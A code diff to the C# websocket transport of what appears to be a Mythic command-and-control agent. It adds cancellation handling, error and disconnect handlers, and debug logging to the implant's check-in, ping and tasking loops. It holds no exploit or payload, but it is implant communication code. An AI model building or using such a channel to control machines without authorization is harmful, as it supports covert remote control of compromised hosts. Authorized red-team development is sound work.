@@ -48,9 +48,12 @@ namespace WebsocketTransport
         private Action sendAction;
         private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
         private string Uuid = "";
+        private CancellationTokenSource cancellationTokenSource;
+        private bool Debug = false;
 
         public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
+            DebugPrint("Initialize agent...");
             CallbackInterval = int.Parse(data["callback_interval"]);
             CallbackJitter = double.Parse(data["callback_jitter"]);
             CallbackPort = int.Parse(data["callback_port"]);
@@ -115,26 +118,27 @@ namespace WebsocketTransport
         {
             agentProcessorTask = new ST.Task(() =>
             {
-                while (Agent.IsAlive())
+                while (Client.IsAlive)
                 {
                     Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                     {
                         return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                     });
                 }
-            });
+            }, cancellationTokenSource.Token);
 
             agentPingTask = new ST.Task(() =>
             {
-                while (Client.IsAlive)
+                while (Client.IsAlive && !cancellationTokenSource.Token.IsCancellationRequested)
                 {
                     Client.Ping();
                     Thread.Sleep(1000);
                 }
-            });
+            }, cancellationTokenSource.Token);
 
             agentProcessorTask.Start();
             agentPingTask.Start();
+            agentPingTask.Wait(cancellationTokenSource.Token);
 
             while (Agent.IsAlive())
             {
@@ -165,16 +169,19 @@ namespace WebsocketTransport
                         Thread.Sleep(100);
                     }
                 }
-            });
+            }, cancellationTokenSource.Token);
 
             agentPingTask = new ST.Task(() =>
             {
                 while (Client.IsAlive)
                 {
-                    Client.Ping();
+                    if (!cancellationTokenSource.Token.IsCancellationRequested)
+                    {
+                        Client.Ping();
+                    }
                     Thread.Sleep(1000);
                 }
-            });
+            }, cancellationTokenSource.Token);
 
             agentProcessorTask = new ST.Task(() =>
             {
@@ -185,15 +192,23 @@ namespace WebsocketTransport
                         return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                     });
                 }
-            });
+            }, cancellationTokenSource.Token);
             agentConsumerTask.Start();
             agentProcessorTask.Start();
             agentPingTask.Start();
-            agentPingTask.Wait();
+            try
+            {
+                agentPingTask.Wait(cancellationTokenSource.Token);
+            }
+            catch (OperationCanceledException)
+            {
+                return;
+            }
         }
 
         public void Start()
         {
+            DebugPrint("Started agent.");
             if (TaskingType == "Poll")
             {
                 Poll();
@@ -217,17 +232,16 @@ namespace WebsocketTransport
 
         public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
         {
-            while (Agent.IsAlive())
+            while (Agent.IsAlive() && Client.IsAlive)
             {
-                receiverEvent.WaitOne();
+                DebugPrint("Waiting to receive message...");
+                receiverEvent.WaitOne(Timeout.Infinite, cancellationTokenSource.Token.IsCancellationRequested);
                 IMythicMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                 if (msg != null)
                 {
                     receiverQueue = new ConcurrentQueue<IMythicMessage>(receiverQueue.Where(m => m != msg));
                     return onResp(msg);
                 }
-                if (!Client.IsAlive)
-                    break;
             }
             return true;
         }
@@ -250,6 +264,8 @@ namespace WebsocketTransport
 
         public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
+            DebugPrint("Connecting...");
+            cancellationTokenSource = new CancellationTokenSource();
             Client = new WebSocket(Endpoint + PostUri);
             Client.WaitTime = TimeSpan.FromHours(8);
 
@@ -271,6 +287,7 @@ namespace WebsocketTransport
 
             Client.OnOpen += OnAsyncConnect;
             Client.OnMessage += OnAsyncMessageReceived;
+            Client.OnError += OnAsyncError;
             Client.OnClose += OnAsyncDisconnect;
 
             Client.Connect();
@@ -328,8 +345,10 @@ namespace WebsocketTransport
             }
         }
 
+
         private bool AddToSenderQueue(IMythicMessage msg)
         {
+            DebugPrint("Adding message to send queue.");
             WebSocketMessage m = new WebSocketMessage()
             {
                 client = true,
@@ -351,15 +370,30 @@ namespace WebsocketTransport
             return true;
         }
 
+        private void OnAsyncError(object sender, ErrorEventArgs e)
+        {
+            DebugPrint("On error.");
+            if (Client.IsAlive)
+            {
+                Client.Close();
+            }
+            cancellationTokenSource.Cancel();
+        }
+
         private void OnAsyncDisconnect(object sender, CloseEventArgs args)
         {
-            // No actions
+            DebugPrint("Disconnected.");
+            if (Client.IsAlive)
+            {
+                Client.Close();
+            }
+            cancellationTokenSource.Cancel();
         }
 
         private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
         {
+            DebugPrint("Message received.");
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
-
             if (EncryptedExchangeCheck)
             {
                 if (!_keyExchanged)
@@ -379,9 +413,21 @@ namespace WebsocketTransport
             receiverEvent.Set();
         }
 
+        private void DebugPrint(string message)
+        {
+            if (Debug)
+            {
+                string timestampString = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                string msg = "[" + timestampString + "] " + message;
+
+                Console.WriteLine(msg);
+
+            }
+        }
 
         private void OnAsyncConnect(object sender, EventArgs args)
         {
+            DebugPrint("Connected.");
             ST.Task tmp = new ST.Task(sendAction);
             writerTasks[Client] = tmp;
             writerTasks[Client].Start();
